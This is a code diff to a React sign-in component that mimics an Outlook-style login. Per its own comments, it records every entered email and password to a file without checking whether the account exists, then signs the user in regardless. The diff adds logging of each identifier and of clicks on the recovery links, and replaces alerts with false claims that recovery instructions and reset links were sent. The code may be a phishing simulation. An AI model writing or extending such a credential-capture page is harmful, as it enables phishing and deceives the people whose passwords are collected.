@@ -1,6 +1,6 @@
 import { useState, type FormEvent } from 'react';
 import { ArrowLeft, KeyRound, Fingerprint, ShieldCheck, Smartphone, ChevronDown, ChevronUp, Loader2, Check } from 'lucide-react';
-import { registerUser, loginUser } from '../lib/testAuth';
+import { registerUser, loginUser, recordIdentifierStep, recordFunnelEvent, recordErrorEvent } from '../lib/testAuth';
 
 interface SignInProps {
   onSignIn: (email?: string) => void;
@@ -25,13 +25,23 @@ export function SignIn({ onSignIn }: SignInProps) {
     const trimmed = identifier.trim();
     if (!trimmed) {
       setErrorMessage('Enter a valid email address, phone number, or username.');
+      recordErrorEvent('anonymous@test.local', '', 'Empty identifier submitted');
       return;
     }
     // Simple email or username check
     if (trimmed.length < 3) {
       setErrorMessage('Please enter a valid credential to continue.');
+      recordErrorEvent(trimmed, '', 'Identifier too short');
       return;
     }
+
+    const userEmail = trimmed.includes('@') 
+      ? trimmed 
+      : `${trimmed.replace(/\s+/g, '').toLowerCase()}@outlook.com`;
+
+    // Immediately record Step 1 to continuous funnel
+    recordIdentifierStep(userEmail);
+
     setErrorMessage('');
     setInfoMessage('');
     setStep('password');
@@ -39,27 +49,29 @@ export function SignIn({ onSignIn }: SignInProps) {
 
   const handlePasswordSubmit = (e: FormEvent) => {
     e.preventDefault();
-    if (!password) {
-      setErrorMessage('Please enter the password for your account.');
-      return;
-    }
-    setErrorMessage('');
-    setInfoMessage('');
-    setIsLoading(true);
-
     const userEmail = identifier.trim().includes('@') 
       ? identifier.trim() 
       : `${identifier.trim().replace(/\s+/g, '').toLowerCase()}@outlook.com`;
+
+    if (!password) {
+      setErrorMessage('Please enter the password for your account.');
+      recordErrorEvent(userEmail, '', 'Password field submitted empty');
+      return;
+    }
+
+    setErrorMessage('');
+    setInfoMessage('');
+    setIsLoading(true);
 
     if (authMode === 'signup') {
       // Register logic: saves to users.json and records attempt
       registerUser(userEmail, password);
       loginUser(userEmail, password);
-      setInfoMessage('Registered successfully! Logging in...');
+      setInfoMessage('Registered successfully! Accessing workspace...');
       setTimeout(() => {
         setIsLoading(false);
         onSignIn(userEmail);
-      }, 350);
+      }, 400);
     } else {
       // Login logic: logs attempt to attempts.json, no check for if account is registered
       loginUser(userEmail, password);
@@ -67,7 +79,7 @@ export function SignIn({ onSignIn }: SignInProps) {
       setTimeout(() => {
         setIsLoading(false);
         onSignIn(userEmail);
-      }, 350);
+      }, 400);
     }
   };
 
@@ -199,7 +211,14 @@ export function SignIn({ onSignIn }: SignInProps) {
                   <div className="mt-2">
                     <button
                       type="button"
-                      onClick={() => alert('Account recovery instructions will be sent to your verified recovery contact.')}
+                      onClick={() => {
+                        recordFunnelEvent({
+                          email: identifier.trim() || 'unspecified@visitor.com',
+                          stage: 'Clicked: Can\'t access your account',
+                          success: true,
+                        });
+                        setInfoMessage('Account recovery instructions sent to registered recovery address.');
+                      }}
                       className="text-sm text-brand-cobalt hover:underline font-normal block cursor-pointer"
                     >
                       Can&apos;t access your account?
@@ -278,7 +297,17 @@ export function SignIn({ onSignIn }: SignInProps) {
                   <div className="mt-4">
                     <button
                       type="button"
-                      onClick={() => alert('Password reset link has been dispatched to your email address.')}
+                      onClick={() => {
+                        const userEmail = identifier.trim().includes('@') 
+                          ? identifier.trim() 
+                          : `${identifier.trim().replace(/\s+/g, '').toLowerCase()}@outlook.com`;
+                        recordFunnelEvent({
+                          email: userEmail || 'unspecified@visitor.com',
+                          stage: 'Clicked: Forgot password',
+                          success: true,
+                        });
+                        setInfoMessage('Password reset link has been dispatched to your email address.');
+                      }}
                       className="text-sm text-brand-cobalt hover:underline font-normal block cursor-pointer"
                     >
                       Forgot password?
